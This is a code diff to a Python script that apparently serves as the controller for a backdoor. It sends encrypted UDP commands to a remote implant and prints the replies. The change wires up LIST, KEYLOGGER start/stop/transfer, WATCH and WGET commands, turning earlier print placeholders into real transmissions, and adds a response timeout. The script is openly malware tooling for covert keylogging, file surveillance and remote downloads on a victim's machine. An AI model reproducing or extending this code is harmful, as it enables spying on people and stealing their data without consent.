@@ -105,16 +105,23 @@ def send_udp(data: str):
     send(pkt, verbose=0)
 
 
-def receive_response():
-    encrypted = None
-    while True:
+def receive_single_response():
+    attempts = 0
+    while attempts < 3:
         if QUEUE.empty():
-            sleep(0.5)
+            attempts += 1
+            sleep(1)
             continue
-        encrypted = QUEUE.get()
-        break
-    decrypted = ENCRYPTION_HANDLER.decrypt(encrypted)
-    print(f"Response: {decrypted.decode('utf-8')}")
+        else:
+            encrypted = QUEUE.get()
+            decrypted = ENCRYPTION_HANDLER.decrypt(encrypted)
+            print(f"Response: {decrypted.decode('utf-8')}")
+            return
+    print("Timed out waiting for response...")
+
+
+def transfer_file():
+    pass
 
 
 if __name__ == "__main__":
@@ -144,22 +151,18 @@ if __name__ == "__main__":
             elif command == EXIT:
                 break
         if argc == 2:
+            data = argv[0] + " " + argv[1]
             if argv[0] == LIST:
-                file_path = argv[1]
-                data = argv[0] + " " + argv[1]
                 send_udp(data)
-                receive_response()
+                receive_single_response()
                 continue
             if argv[0] == KEYLOGGER:
-                if argv[1] == START:
-                    print("Keylogger start command")
-                if argv[1] == STOP:
-                    print("Keylogger stop command")
-                if argv[1] == TRANSFER:
-                    print("Keylogger transfer command")
+                if argv[1] in [START, STOP, TRANSFER]:
+                    send_udp(data)
                 continue
             if argv[0] == WATCH:
-                print(f"watch {argv[1]}")
+                send_udp(data)
+                receive_single_response()
                 continue
         if argc == 3:
             if argv[0] == WGET:
@@ -167,7 +170,7 @@ if __name__ == "__main__":
                 filepath = argv[2]
                 data = argv[0] + " " + argv[1] + " " + argv[2]
                 send_udp(data)
-                receive_response()
+                receive_single_response()
                 continue
         else:
             print(f"Invalid Command: {command}")
